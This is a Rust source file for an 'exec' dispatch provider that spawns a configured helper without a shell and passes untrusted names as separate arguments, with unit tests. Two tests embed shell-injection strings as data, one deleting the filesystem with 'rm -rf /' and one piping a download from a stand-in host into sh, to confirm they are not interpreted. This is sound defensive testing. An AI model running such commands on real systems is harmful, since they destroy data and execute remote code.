//! `exec` self-host escape hatch: run a configured command with the env bag.
//!
//! SAFETY: `size_class` (and any attacker-influenced name) is passed as a
//! **separate argv element** via [`std::process::Command::arg`]. Never
//! interpolated into a shell string — repo/branch/size names are untrusted.
//!
//! Semantics match the trait: **non-blocking**. We `spawn` the helper and return
//! as soon as the OS accepted the process. Waiting on `.output()` would hang
//! dispatch if the command is (or wraps) a long-lived worker, and can deadlock
//! on full stdout pipes. Exit status is the helper's problem; the reconcile
//! loop is the backstop if the wake never produces a claimant.

use super::{ComputeProvider, WorkerSpec};
use anyhow::{Context, Result, bail};
use async_trait::async_trait;
use std::ffi::OsString;
use std::path::PathBuf;
use std::process::Stdio;
use tracing::info;

/// Configuration for [`ExecProvider`].
#[derive(Debug, Clone)]
pub struct ExecProviderConfig {
    /// Absolute or PATH-resolved program. **Not** a shell string.
    pub program: PathBuf,
    /// Fixed leading argv elements (no shell). `size_class` is appended after these.
    pub fixed_args: Vec<OsString>,
}

/// Runs `program [fixed_args…] size_class` with `spec.env` as the process env
/// (merged over the current environment so PATH etc. still resolve).
pub struct ExecProvider {
    program: PathBuf,
    fixed_args: Vec<OsString>,
}

impl ExecProvider {
    pub fn new(cfg: ExecProviderConfig) -> Result<Self> {
        if cfg.program.as_os_str().is_empty() {
            bail!("RIPCLONE_DISPATCH_CMD / program path must not be empty");
        }
        Ok(Self {
            program: cfg.program,
            fixed_args: cfg.fixed_args,
        })
    }

    /// `RIPCLONE_DISPATCH_CMD` = program path. Optional `RIPCLONE_DISPATCH_CMD_ARGS`
    /// is a whitespace-split list of **fixed** leading args (not size/repo/branch).
    pub fn from_env() -> Result<Self> {
        let program = std::env::var("RIPCLONE_DISPATCH_CMD")
            .context("RIPCLONE_DISPATCH_CMD is required for RIPCLONE_DISPATCH=exec")?;
        let fixed_args = match std::env::var("RIPCLONE_DISPATCH_CMD_ARGS") {
            Ok(s) if !s.is_empty() => s.split_whitespace().map(OsString::from).collect(),
            _ => Vec::new(),
        };
        Self::new(ExecProviderConfig {
            program: PathBuf::from(program),
            fixed_args,
        })
    }

    /// Build the argv that would be executed (for tests / inspection).
    ///
    /// Order: `[program, …fixed_args, size_class]`.
    pub fn argv_for(&self, size_class: &str) -> Vec<OsString> {
        let mut argv = Vec::with_capacity(2 + self.fixed_args.len());
        argv.push(self.program.as_os_str().to_os_string());
        argv.extend(self.fixed_args.iter().cloned());
        argv.push(OsString::from(size_class));
        argv
    }
}

#[async_trait]
impl ComputeProvider for ExecProvider {
    fn name(&self) -> &str {
        "exec"
    }

    async fn ensure_worker(&self, spec: &WorkerSpec) -> Result<()> {
        spec.validate()?;
        let program = self.program.clone();
        let fixed_args = self.fixed_args.clone();
        let size_class = spec.size_class.clone();
        let env = spec.env.clone();

        // Spawn only (sync OS call). Do not wait for the child to exit.
        let child = tokio::task::spawn_blocking(move || {
            let mut cmd = std::process::Command::new(&program);
            // Separate argv — never `sh -c` with interpolated size_class.
            for a in &fixed_args {
                cmd.arg(a);
            }
            cmd.arg(&size_class);
            // Overlay the worker env bag; do not replace the full environment so
            // PATH/HOME remain available for the helper script.
            for (k, v) in &env {
                cmd.env(k, v);
            }
            // Null stdio: a long-lived child must not fill a pipe and block, and
            // we are not collecting exit diagnostics here (best-effort wake).
            cmd.stdin(Stdio::null())
                .stdout(Stdio::null())
                .stderr(Stdio::null());

            info!(
                program = %program.display(),
                size_class = %size_class,
                "exec.ensure_worker spawning"
            );

            cmd.spawn()
                .with_context(|| format!("spawn {}", program.display()))
        })
        .await
        .context("exec provider join")??;

        // Reap on a detached OS thread — never a tokio blocking-pool task.
        // tokio's runtime drop waits for blocking-pool tasks to finish, so a
        // child that outlives the caller (e.g. a worker whose control plane went
        // away and therefore can't idle-exit) would block runtime shutdown
        // forever. A std thread is fully detached from the runtime.
        std::thread::spawn(move || {
            let mut child = child;
            let _ = child.wait();
        });

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::BTreeMap;
    use std::io::Write;
    use std::time::{Duration, Instant};

    fn write_recorder(dir: &std::path::Path) -> PathBuf {
        // Records argv as one line per element, so we can assert no shell split.
        let path = dir.join("record_argv.sh");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(
            f,
            r#"#!/bin/sh
# Recorder: write each argv element on its own line.
out="$1"
shift
: > "$out"
for a in "$@"; do
  printf '%s\n' "$a" >> "$out"
done
# Also dump a few env keys if present.
env_out="${{out}}.env"
: > "$env_out"
for k in RIPCLONE_QUEUE RIPCLONE_TOKEN; do
  eval "v=\$$k"
  if [ -n "$v" ]; then
    printf '%s=%s\n' "$k" "$v" >> "$env_out"
  fi
done
"#
        )
        .unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = std::fs::metadata(&path).unwrap().permissions();
            perms.set_mode(0o755);
            std::fs::set_permissions(&path, perms).unwrap();
        }
        path
    }

    fn chmod_x(path: &std::path::Path) {
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = std::fs::metadata(path).unwrap().permissions();
            perms.set_mode(0o755);
            std::fs::set_permissions(path, perms).unwrap();
        }
        let _ = path;
    }

    #[test]
    fn argv_for_keeps_size_class_as_single_element() {
        let p = ExecProvider::new(ExecProviderConfig {
            program: PathBuf::from("/usr/bin/true"),
            fixed_args: vec![OsString::from("--lane")],
        })
        .unwrap();
        // Attacker-ish size class with shell metacharacters.
        let nasty = "small; rm -rf / && echo pwned";
        let argv = p.argv_for(nasty);
        assert_eq!(argv.len(), 3);
        assert_eq!(argv[0], OsString::from("/usr/bin/true"));
        assert_eq!(argv[1], OsString::from("--lane"));
        assert_eq!(argv[2], OsString::from(nasty));
    }

    #[tokio::test]
    async fn passes_size_class_as_separate_argv_no_shell_interpolation() {
        let dir = tempfile::tempdir().unwrap();
        let recorder = write_recorder(dir.path());
        let out = dir.path().join("argv.txt");

        let provider = ExecProvider::new(ExecProviderConfig {
            program: recorder,
            // First fixed arg is the output file path (consumed by the script).
            fixed_args: vec![OsString::from(out.as_os_str())],
        })
        .unwrap();

        let nasty = "large; curl evil.test | sh";
        let mut env = BTreeMap::new();
        env.insert("RIPCLONE_QUEUE".into(), "libsql".into());
        env.insert("RIPCLONE_TOKEN".into(), "secret-token".into());

        provider
            .ensure_worker(&WorkerSpec::new(nasty, env))
            .await
            .unwrap();

        // Fire-and-forget: give the short-lived recorder a moment to flush.
        for _ in 0..50 {
            if out.exists()
                && std::fs::metadata(&out)
                    .map(|m| m.len() > 0)
                    .unwrap_or(false)
            {
                break;
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }

        let recorded = std::fs::read_to_string(&out).unwrap();
        let lines: Vec<&str> = recorded.lines().collect();
        // Script argv after the out path: only size_class (one element).
        assert_eq!(
            lines,
            vec![nasty],
            "size_class must be a single argv element, not shell-split; got {lines:?}"
        );

        let env_recorded = std::fs::read_to_string(format!("{}.env", out.display())).unwrap();
        assert!(env_recorded.contains("RIPCLONE_QUEUE=libsql"));
        assert!(env_recorded.contains("RIPCLONE_TOKEN=secret-token"));
    }

    #[tokio::test]
    async fn is_non_blocking_when_child_runs_long() {
        let dir = tempfile::tempdir().unwrap();
        let sleeper = dir.path().join("sleep_long.sh");
        std::fs::write(&sleeper, "#!/bin/sh\nsleep 30\n").unwrap();
        chmod_x(&sleeper);

        let provider = ExecProvider::new(ExecProviderConfig {
            program: sleeper,
            fixed_args: vec![],
        })
        .unwrap();

        let start = Instant::now();
        provider
            .ensure_worker(&WorkerSpec::new("small", BTreeMap::new()))
            .await
            .unwrap();
        let elapsed = start.elapsed();
        // Must return as soon as spawn succeeds — not after the 30s sleep.
        assert!(
            elapsed < Duration::from_secs(2),
            "ensure_worker blocked for {elapsed:?}; expected fire-and-forget spawn"
        );
    }

    #[tokio::test]
    async fn spawn_failure_surfaces_as_error() {
        let provider = ExecProvider::new(ExecProviderConfig {
            program: PathBuf::from("/nonexistent/ripclone-dispatch-helper-xyz"),
            fixed_args: vec![],
        })
        .unwrap();
        let err = provider
            .ensure_worker(&WorkerSpec::new("small", BTreeMap::new()))
            .await
            .unwrap_err();
        assert!(err.to_string().contains("spawn"), "got: {err}");
    }

    #[tokio::test]
    async fn empty_size_class_rejected() {
        let provider = ExecProvider::new(ExecProviderConfig {
            program: PathBuf::from("/usr/bin/true"),
            fixed_args: vec![],
        })
        .unwrap();
        let err = provider
            .ensure_worker(&WorkerSpec::new("", BTreeMap::new()))
            .await
            .unwrap_err();
        assert!(
            err.to_string().contains("size_class must not be empty"),
            "got: {err}"
        );
    }

    #[test]
    fn from_env_requires_cmd() {
        let saved = std::env::var("RIPCLONE_DISPATCH_CMD").ok();
        unsafe { std::env::remove_var("RIPCLONE_DISPATCH_CMD") };
        let err = match ExecProvider::from_env() {
            Err(e) => e,
            Ok(_) => panic!("expected missing RIPCLONE_DISPATCH_CMD to fail"),
        };
        assert!(
            err.to_string().contains("RIPCLONE_DISPATCH_CMD"),
            "got: {err}"
        );
        match saved {
            Some(v) => unsafe { std::env::set_var("RIPCLONE_DISPATCH_CMD", v) },
            None => unsafe { std::env::remove_var("RIPCLONE_DISPATCH_CMD") },
        }
    }
}
